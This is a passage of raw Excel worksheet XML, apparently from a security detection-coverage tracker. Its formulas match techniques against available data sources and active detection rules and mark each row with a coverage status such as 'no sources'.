      <c r="F555" s="9">
        <f t="shared" si="8"/>
        <v>3</v>
      </c>
      <c r="G555" s="9" cm="1">
        <f t="array" ref="G555">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H555" s="9" cm="1">
        <f t="array" ref="H555">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I555" s="9" t="str" cm="1">
        <f t="array" ref="I555">IF(SUM(IF($C555=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C555=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J555" s="9" cm="1">
        <f t="array" ref="J55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555" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M555" s="9" cm="1">
        <f t="array" ref="M555">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N555" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O555" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P555" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S55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55" t="s">
        <v>2513</v>
      </c>
      <c r="U555" t="s">
        <v>2613</v>
      </c>
      <c r="V555" t="s">
        <v>2614</v>
      </c>
      <c r="W555" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="556" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A556" t="s">
        <v>2611</v>
      </c>
      <c r="B556" t="s">
        <v>2615</v>
      </c>
      <c r="C556" t="s">
        <v>269</v>
      </c>
      <c r="D556" t="s">
        <v>1</v>
      </c>
      <c r="E556" t="s">
        <v>2616</v>
      </c>
      <c r="F556" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G556" s="9" cm="1">
        <f t="array" ref="G556">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H556" s="9" t="str" cm="1">
        <f t="array" ref="H556">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I556" s="9" t="str" cm="1">
        <f t="array" ref="I556">IF(SUM(IF($C556=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C556=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J556" s="9" t="str" cm="1">
        <f t="array" ref="J55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56" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M556" s="9" cm="1">
        <f t="array" ref="M556">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N556" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O556" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P556" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S55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56" t="s">
        <v>2513</v>
      </c>
      <c r="U556" t="s">
        <v>2617</v>
      </c>
      <c r="V556" t="s">
        <v>2618</v>
      </c>
      <c r="W556" t="b">
        <v>1</v>
      </c>
      <c r="X556" t="s">
        <v>2611</v>
      </c>
    </row>
    <row r="557" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A557" t="s">
        <v>2611</v>
      </c>
      <c r="B557" t="s">
        <v>2619</v>
      </c>
      <c r="C557" t="s">
        <v>2620</v>
      </c>
      <c r="D557" t="s">
        <v>1</v>
      </c>
      <c r="E557" t="s">
        <v>2621</v>
      </c>
      <c r="F557" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G557" s="9" cm="1">
        <f t="array" ref="G557">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H557" s="9" t="str" cm="1">
        <f t="array" ref="H557">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I557" s="9" t="str" cm="1">
        <f t="array" ref="I557">IF(SUM(IF($C557=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C557=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J557" s="9" t="str" cm="1">
        <f t="array" ref="J55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57" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M557" s="9" cm="1">
        <f t="array" ref="M557">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N557" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O557" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P557" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S55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57" t="s">
        <v>2513</v>
      </c>
      <c r="U557" t="s">
        <v>2622</v>
      </c>
      <c r="V557" t="s">
        <v>2623</v>
      </c>
      <c r="W557" t="b">
        <v>1</v>
      </c>
      <c r="X557" t="s">
        <v>2611</v>
      </c>
    </row>
    <row r="558" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A558" t="s">
        <v>2611</v>
      </c>
      <c r="B558" t="s">
        <v>2624</v>
      </c>
      <c r="C558" t="s">
        <v>2625</v>
      </c>
      <c r="D558" t="s">
        <v>1</v>
      </c>
      <c r="E558" t="s">
        <v>2540</v>
      </c>
      <c r="F558" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G558" s="9" cm="1">
        <f t="array" ref="G558">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H558" s="9" t="str" cm="1">
        <f t="array" ref="H558">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I558" s="9" t="str" cm="1">
        <f t="array" ref="I558">IF(SUM(IF($C558=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C558=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J558" s="9" t="str" cm="1">
        <f t="array" ref="J55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58" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M558" s="9" cm="1">
        <f t="array" ref="M558">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N558" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O558" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P558" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S55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58" t="s">
        <v>2513</v>
      </c>
      <c r="U558" t="s">
        <v>2626</v>
      </c>
      <c r="V558" t="s">
        <v>2627</v>
      </c>
      <c r="W558" t="b">
        <v>1</v>
      </c>
      <c r="X558" t="s">
        <v>2611</v>
      </c>
    </row>
    <row r="559" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A559" t="s">
        <v>2611</v>
      </c>
      <c r="B559" t="s">
        <v>2628</v>
      </c>
      <c r="C559" t="s">
        <v>2629</v>
      </c>
      <c r="D559" t="s">
        <v>1</v>
      </c>
      <c r="F559" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G559" s="9" cm="1">
        <f t="array" ref="G559">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H559" s="9" t="str" cm="1">
        <f t="array" ref="H559">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I559" s="9" t="str" cm="1">
        <f t="array" ref="I559">IF(SUM(IF($C559=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C559=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J559" s="9" t="str" cm="1">
        <f t="array" ref="J55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59" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M559" s="9" cm="1">
        <f t="array" ref="M559">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N559" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O559" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P559" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S55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59" t="s">
        <v>2513</v>
      </c>
      <c r="U559" t="s">
        <v>2630</v>
      </c>
      <c r="V559" t="s">
        <v>2631</v>
      </c>
      <c r="W559" t="b">
        <v>1</v>
      </c>
      <c r="X559" t="s">
        <v>2611</v>
      </c>
    </row>
    <row r="560" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A560" t="s">
        <v>2632</v>
      </c>
      <c r="B560" t="s">
        <v>2632</v>
      </c>
      <c r="C560" t="s">
        <v>91</v>
      </c>
      <c r="D560" t="s">
        <v>1</v>
      </c>
      <c r="E560" t="s">
        <v>2633</v>
      </c>
      <c r="F560" s="9">
        <f t="shared" si="8"/>
        <v>4</v>
      </c>
      <c r="G560" s="9" cm="1">
        <f t="array" ref="G560">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H560" s="9" cm="1">
        <f t="array" ref="H560">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>7</v>
      </c>
      <c r="I560" s="9" t="str" cm="1">
        <f t="array" ref="I560">IF(SUM(IF($C560=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C560=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J560" s="9" cm="1">
        <f t="array" ref="J56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560" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>7</v>
      </c>
      <c r="M560" s="9" cm="1">
        <f t="array" ref="M560">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>7</v>
      </c>
      <c r="N560" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O560" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P560" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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60" t="s">
        <v>2513</v>
      </c>
      <c r="U560" t="s">
        <v>2634</v>
      </c>
      <c r="V560" t="s">
        <v>2635</v>
      </c>
      <c r="W560" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="561" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A561" t="s">
        <v>2632</v>
      </c>
      <c r="B561" t="s">
        <v>2636</v>
      </c>
      <c r="C561" t="s">
        <v>268</v>
      </c>
      <c r="D561" t="s">
        <v>1</v>
      </c>
      <c r="E561" t="s">
        <v>2616</v>
      </c>
      <c r="F561" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G561" s="9" cm="1">
        <f t="array" ref="G561">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H561" s="9" t="str" cm="1">
        <f t="array" ref="H561">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I561" s="9" t="str" cm="1">
        <f t="array" ref="I561">IF(SUM(IF($C561=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C561=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J561" s="9" t="str" cm="1">
        <f t="array" ref="J56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61" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M561" s="9" cm="1">
        <f t="array" ref="M561">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N561" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O561" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P561" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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61" t="s">
        <v>2513</v>
      </c>
      <c r="U561" t="s">
        <v>2637</v>
      </c>
      <c r="V561" t="s">
        <v>2638</v>
      </c>
      <c r="W561" t="b">
        <v>1</v>
      </c>
      <c r="X561" t="s">
        <v>2632</v>
      </c>
    </row>
    <row r="562" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A562" t="s">
        <v>2632</v>
      </c>
      <c r="B562" t="s">
        <v>2639</v>
      </c>
      <c r="C562" t="s">
        <v>2640</v>
      </c>
      <c r="D562" t="s">
        <v>1</v>
      </c>
      <c r="E562" t="s">
        <v>2621</v>
      </c>
      <c r="F562" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G562" s="9" cm="1">
        <f t="array" ref="G562">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H562" s="9" t="str" cm="1">
        <f t="array" ref="H562">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I562" s="9" t="str" cm="1">
        <f t="array" ref="I562">IF(SUM(IF($C562=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C562=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J562" s="9" t="str" cm="1">
        <f t="array" ref="J56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62" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M562" s="9" cm="1">
        <f t="array" ref="M562">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N562" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O562" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P562" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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62" t="s">
        <v>2513</v>
      </c>
      <c r="U562" t="s">
        <v>2641</v>
      </c>
      <c r="V562" t="s">
        <v>2642</v>
      </c>
      <c r="W562" t="b">
        <v>1</v>
      </c>
      <c r="X562" t="s">
        <v>2632</v>
      </c>
    </row>
    <row r="563" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A563" t="s">
        <v>2632</v>
      </c>
      <c r="B563" t="s">
        <v>2643</v>
      </c>
      <c r="C563" t="s">
        <v>2644</v>
      </c>
      <c r="D563" t="s">
        <v>1</v>
      </c>
      <c r="E563" t="s">
        <v>2621</v>
      </c>
      <c r="F563" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G563" s="9" cm="1">
        <f t="array" ref="G563">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H563" s="9" t="str" cm="1">
        <f t="array" ref="H563">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I563" s="9" t="str" cm="1">
        <f t="array" ref="I563">IF(SUM(IF($C563=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C563=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J563" s="9" t="str" cm="1">
        <f t="array" ref="J56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63" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M563" s="9" cm="1">
        <f t="array" ref="M563">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N563" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O563" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P563" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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63" t="s">
        <v>2513</v>
      </c>
      <c r="U563" t="s">
        <v>2645</v>
      </c>
      <c r="V563" t="s">
        <v>2646</v>
      </c>
      <c r="W563" t="b">
        <v>1</v>
      </c>
      <c r="X563" t="s">
        <v>2632</v>
      </c>
    </row>
    <row r="564" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A564" t="s">
        <v>2632</v>
      </c>
      <c r="B564" t="s">
        <v>2647</v>
      </c>
      <c r="C564" t="s">
        <v>2648</v>
      </c>
      <c r="D564" t="s">
        <v>1</v>
      </c>
      <c r="E564" t="s">
        <v>2649</v>
      </c>
      <c r="F564" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G564" s="9" cm="1">
        <f t="array" ref="G564">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H564" s="9" t="str" cm="1">
        <f t="array" ref="H564">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I564" s="9" t="str" cm="1">
        <f t="array" ref="I564">IF(SUM(IF($C564=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C564=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J564" s="9" t="str" cm="1">
        <f t="array" ref="J56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64" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M564" s="9" cm="1">
